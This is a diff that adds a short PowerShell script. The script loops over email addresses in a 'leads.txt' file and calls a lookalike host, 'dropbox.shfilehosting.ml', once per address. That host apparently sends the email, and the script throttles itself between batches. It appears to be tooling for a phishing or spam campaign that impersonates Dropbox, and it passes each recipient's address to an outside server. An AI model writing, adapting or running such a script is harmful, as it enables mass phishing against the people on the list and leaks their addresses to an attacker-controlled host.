@@ -1,0 +1,21 @@
+$leads = get-content "leads.txt"
+$counter = 0
+
+foreach($l in $leads)
+{
+   if($counter % 3 -eq 0)
+   {
+      write-output "Chill a bit.."
+      sleep 7
+   }
+   write-output "Sending email to $l"
+   $u = "http://dropbox.shfilehosting.ml/mmm?em=$l";
+   $wc = New-Object System.Net.WebClient
+   $ret = $wc.DownloadString($u)
+   #$ret = "Email to $l was successful!"
+   
+   write-output $ret
+   write-output ""
+   sleep 3
+   ++$counter
+}
